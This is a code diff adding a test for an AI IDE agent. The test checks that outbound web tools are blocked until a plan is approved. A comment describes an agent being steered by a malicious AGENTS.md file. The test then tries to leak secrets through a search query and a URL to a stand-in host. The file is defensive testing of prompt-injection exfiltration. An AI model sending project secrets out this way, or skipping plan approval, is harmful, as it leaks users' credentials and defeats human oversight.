@@ -90,6 +90,25 @@ describe('IDE request authority, review and recovery effects', () => {
     expect(await getTool('run_terminal_command')!.handler({}, {} as any)).toMatchObject({ success: true });
     expect(fs.readFileSync(effect, 'utf8')).toBe('effect');
   });
+  test('outbound web tools are not read-only: an unapproved IDE turn cannot send project text out', async () => {
+    const sent: unknown[] = [];
+    registerTool('web_search', { name: 'web_search' } as any, async (args: any) => { sent.push(args); return { success: true }; });
+    registerTool('fetch_url', { name: 'fetch_url' } as any, async (args: any) => { sent.push(args); return { success: true }; });
+    // Planning turn (no approved plan), e.g. steered by a malicious AGENTS.md.
+    await runWorkspaceRequest(request({ root: rootA }), 1, async () => {
+      expect(workspaceToolError('read_file')).toBeUndefined();
+      expect(workspaceToolError('web_search')).toMatch(/Approve a plan.*Nothing was sent/);
+      expect(workspaceToolError('fetch_url')).toMatch(/Approve a plan.*Nothing was sent/);
+      expect(await getTool('web_search')!.handler({ query: 'SECRET=from-.env' }, {} as any)).toMatchObject({ success: false });
+      expect(await getTool('fetch_url')!.handler({ url: 'https://example.invalid/?d=SECRET' }, {} as any)).toMatchObject({ success: false });
+    });
+    expect(sent).toEqual([]);
+    // An explicitly approved plan for this sender/root may use them.
+    await runWorkspaceRequest(request(approved(rootA)), 1, async () => {
+      expect(workspaceToolError('web_search')).toBeUndefined();
+      expect(workspaceToolError('fetch_url')).toBeUndefined();
+    });
+  });
   test('Stop belongs to the requesting window and blocks a late confirmed edit', async () => {
     let release!: () => void;
     const gate = new Promise<void>(resolve => { release = resolve; });
